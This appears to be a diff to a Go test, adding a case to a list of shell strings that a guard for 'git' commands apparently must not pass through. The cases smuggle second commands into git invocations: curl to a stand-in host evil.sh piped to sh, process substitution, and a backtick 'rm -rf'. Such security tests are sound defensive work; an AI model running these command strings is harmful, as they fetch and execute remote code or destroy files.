@@ -104,6 +104,7 @@ func TestRunPiUnattestablePassthrough(t *testing.T) {
 		"git log $(curl evil.sh)",
 		"git status `rm -rf /tmp/x`",
 		"git status\r curl evil.sh | sh",
+		"git status <(curl https://evil.sh)",
 	}
 
 	for _, cmd := range cases {
